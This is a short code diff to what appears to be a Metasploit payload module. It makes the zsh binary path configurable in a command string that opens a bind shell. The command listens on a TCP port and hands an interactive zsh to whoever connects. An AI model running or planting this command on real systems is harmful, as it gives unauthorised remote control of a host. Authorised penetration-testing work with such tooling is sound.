@@ -36,6 +36,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('ZSH_PATH', [true ,'The path to ZSH', 'zsh'])
+    ])
   end
 
   #
@@ -49,6 +52,6 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "zsh -c 'zmodload zsh/net/tcp && ztcp -l #{datastore['LPORT']} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+    "#{datastore['ZSH_PATH']} -c 'zmodload zsh/net/tcp && ztcp -l #{datastore['LPORT']} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
   end
 end
